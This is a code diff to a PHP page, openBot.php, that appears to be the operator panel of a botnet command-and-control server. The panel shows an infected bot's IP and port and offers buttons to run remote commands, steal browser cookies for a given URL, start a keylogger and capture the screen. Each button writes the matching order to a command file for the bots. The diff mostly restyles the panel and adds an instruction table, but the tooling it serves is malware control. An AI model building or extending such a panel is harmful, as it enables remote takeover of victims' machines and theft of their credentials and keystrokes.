@@ -240,6 +240,15 @@ fclose($fp);
             width: 100%;
             min-height: 90%;
             padding: 30px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .content_table {
+            width: 100%;
+            text-align: center;
+            border: 1px solid #00ff00;
         }
 
         .content_table {
@@ -262,6 +271,10 @@ fclose($fp);
         .content_table-td {
             font-weight: bold;
             border: 1px solid #00ff00;
+            max-width: 300px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
         }
 
         .content_table-th {
@@ -313,6 +326,29 @@ fclose($fp);
             outline: none;
             cursor: pointer;
         }
+
+        .content_back {
+            margin-top: 16px;
+            color: #00ff00;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            text-decoration: underline;
+            background: transparent;
+            cursor: pointer;
+            align-self: flex-start;
+        }
+
+        .content-container {
+            display: flex;
+            flex-direction: row;
+            justify-content: space-between;
+            column-gap: 100px;
+        }
+
+        .content_ins {
+            flex: 1;
+        }
     </style>
 </head>
 
@@ -338,33 +374,58 @@ fclose($fp);
                 </ul>
             </div>
             <div class="content">
-                <form class="content_form" method="post" action="openBot.php<?php
-                                                                            if ($ID != "All") {
-                                                                                echo '?ID=' . $ID . '';
-                                                                            }
-                                                                            ?>" id="cmdform">
-                    <div class="content_element">
-                        <label class="content_element-label" for="ip">IP:</label>
-                        <input class="content_element-input" id="ip" type="text" name="ip" readonly value="<?php echo $ip ?>" />
-                    </div>
-                    <div class="content_element">
-                        <label class="content_element-label" for="port">PORT:</label>
-                        <input class="content_element-input" id="port" type="text" name="port" readonly value="<?php echo $port; ?>" />
-                    </div>
-                    <div style="margin-top:20px ;">
-                        <label class="content_element-label" style="display: block; text-align:center; margin-bottom: 8px; text-transform: uppercase; font-size:16px;" for="command">Enter command:</label>
-                        <input class="content_element-input" id="command" type="text" name="cmdstr" />
-                    </div>
-                    <!-- <p class="content_element-label" style="width:100%;">Enter command: </p>
+                <div class="content-container">
+
+
+                    <form class="content_form" method="post" action="openBot.php<?php
+                                                                                if ($ID != "All") {
+                                                                                    echo '?ID=' . $ID . '';
+                                                                                }
+                                                                                ?>" id="cmdform">
+                        <div class="content_element">
+                            <label class="content_element-label" for="ip">IP:</label>
+                            <input class="content_element-input" id="ip" type="text" name="ip" readonly value="<?php echo $ip ?>" />
+                        </div>
+                        <div class="content_element">
+                            <label class="content_element-label" for="port">PORT:</label>
+                            <input class="content_element-input" id="port" type="text" name="port" readonly value="<?php echo $port; ?>" />
+                        </div>
+                        <div style="margin-top:20px ;">
+                            <label class="content_element-label" style="display: block; text-align:center; margin-bottom: 8px; text-transform: uppercase; font-size:16px;" for="command">Enter command:</label>
+                            <input class="content_element-input" id="command" type="text" name="cmdstr" />
+                        </div>
+                        <!-- <p class="content_element-label" style="width:100%;">Enter command: </p>
                     <input class="content_element-input" type="text" name="cmdstr" > -->
-                    <div class="content_button">
-                        <p><input class=" content_button-el" type="submit" name="buttonCmd" value="Cmd"></p>
-                        <p><input class=" content_button-el" type="submit" name="buttonCookie" value="Cookie"></p>
-                        <p><input class=" content_button-el" type="submit" name="buttonKeylogger" value="Keylogger"></p>
-                        <p><input class=" content_button-el" type="submit" name="buttonCapture" value="Capture"></p>
+                        <div class="content_button">
+                            <p><input class=" content_button-el" type="submit" name="buttonCmd" value="Cmd"></p>
+                            <p><input class=" content_button-el" type="submit" name="buttonCookie" value="Cookie"></p>
+                            <p><input class=" content_button-el" type="submit" name="buttonKeylogger" value="Keylogger"></p>
+                            <p><input class=" content_button-el" type="submit" name="buttonCapture" value="Capture"></p>
+                        </div>
+
+                    </form>
+                    <div class="content_ins">
+                        <table class="content_table">
+                            <tr class="content_table-tr">
+                                <td class="content_table-td">Get cmd</td>
+                                <td class="content_table-td">Enter cmd<br> Click Cmd button</td>
+                            </tr>
+                            <tr class="content_table-tr">
+                                <td class="content_table-td">Get cookie</td>
+                                <td class="content_table-td">Enter url<br> Click Cookie button</td>
+                            </tr>
+                            <tr class="content_table-tr">
+                                <td class="content_table-td">Get keylogger</td>
+                                <td class="content_table-td">Click Cmd button</td>
+                            </tr>
+                            <tr class="content_table-tr">
+                                <td class="content_table-td">Get capture</td>
+                                <td class="content_table-td">Click Capture button</td>
+                            </tr>
+                        </table>                                                                
                     </div>
-                    <p><a style="color: #00ff00; text-decoration:underline;" href='index.php'>Back to Main</a></p>
-                </form>
+                </div>
+                <button class="content_back" onclick="history.back()">Go Back</button>
             </div>
         </div>
         <div class="navigate">
@@ -411,23 +472,21 @@ if (isset($_POST['buttonCmd'])) {
     }
 } else if (isset($_POST['buttonKeylogger'])) {
 
-        $temp = "abc";
-        echo 'Request keylogger <br>';
-        $fp = fopen('commandBot.txt', 'w');
-        fwrite($fp, "getkeylogger");
-        fwrite($fp, '&');
-        fwrite($fp, $temp);
-        fclose($fp);
-    
+    $temp = "abc";
+    echo 'Request keylogger <br>';
+    $fp = fopen('commandBot.txt', 'w');
+    fwrite($fp, "getkeylogger");
+    fwrite($fp, '&');
+    fwrite($fp, $temp);
+    fclose($fp);
 } else if (isset($_POST['buttonCapture'])) {
 
 
-        echo 'Request Capture <br>';
-        $fp = fopen('commandBot.txt', 'w');
-        fwrite($fp, "getcapture");
-        fwrite($fp, '&');
-        fwrite($fp, "aaaa");
-        fclose($fp);
-    
+    echo 'Request Capture <br>';
+    $fp = fopen('commandBot.txt', 'w');
+    fwrite($fp, "getcapture");
+    fwrite($fp, '&');
+    fwrite($fp, "aaaa");
+    fclose($fp);
 }
 ?>
